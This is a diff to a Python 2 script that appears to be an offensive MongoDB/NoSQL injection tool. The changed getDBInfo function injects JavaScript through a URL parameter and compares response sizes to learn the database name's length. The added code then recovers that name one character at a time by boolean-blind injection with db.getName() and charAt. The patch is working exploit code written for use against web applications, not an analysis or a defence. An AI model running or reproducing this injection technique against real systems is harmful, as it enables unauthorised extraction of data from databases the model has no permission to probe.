@@ -1075,13 +1075,18 @@ def brute_pass(user,key):
 def getDBInfo():
 	curLen = 0
 	nameLen = 0
+	gotFullDb = False
 	gotNameLen = False
 	gotDbName = False
 	gotColLen = False
 	gotColName = False
+	dbName = ""
+	charCounter = 0
+	nameCounter = 0
+	chars = string.ascii_letters + string.digits
 	print "Getting baseline True query return size..."
 	trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
-	print "Debug " + str(trueUri)
+	#print "Debug " + str(trueUri)
 	baseLen = int(len(urllib.urlopen(trueUri).read()))
 	print "Got baseline true query length of " + str(baseLen)
 	
@@ -1090,16 +1095,39 @@ def getDBInfo():
 	
 	while gotNameLen == False:
 		calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} vardum='a" + "&")
-		print "Debug: " + calcUri
+		#print "Debug: " + calcUri
 		lenUri = int(len(urllib.urlopen(calcUri).read()))
-		print "Debug length: " + str(lenUri)
+		#print "Debug length: " + str(lenUri)
 		
 		if lenUri == baseLen:
-			print " Got database name length of " + str(curLen) + " characters."
+			print "Got database name length of " + str(curLen) + " characters."
 			gotNameLen = True
 		
 		else:
 			curLen += 1
+	
+	print "Database Name: ", 		
+	while gotDbName == False:
+		charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } vardum='a")
+		#print "Debug: " + charUri
+		
+		lenUri = int(len(urllib.urlopen(charUri).read()))
+		#print "debug: " + str(charCounter)
+		#print "Debug length: " + str(lenUri)
+		
+		if lenUri == baseLen:
+			dbName = dbName + chars[charCounter]
+			print chars[charCounter],
+			nameCounter += 1
+			charCounter = 0
+			
+			if nameCounter == curLen:
+				gotDbName = True
+			
+		
+		else:
+			charCounter += 1
+	print "\n"	
 	raw_input("Press enter to continue...")
 
 mainMenu()
